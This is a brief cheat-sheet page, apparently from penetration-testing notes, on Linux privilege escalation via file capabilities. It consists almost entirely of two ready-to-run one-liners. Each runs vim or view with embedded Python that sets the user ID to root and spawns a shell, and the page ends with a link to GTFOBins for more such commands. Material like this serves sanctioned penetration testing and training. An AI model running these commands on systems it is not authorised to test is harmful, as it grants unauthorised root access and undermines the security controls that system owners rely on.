# Linux Privilege Escalation with Set Capabilities
[< Back to Menu](README.md)
## vim
> /usr/bin/vim
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## view
> /usr/bin/view
```bash
view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## GTFOBins
For more commands to be exploited, go to [GTFOBins](https://gtfobins.github.io/#+capabilities)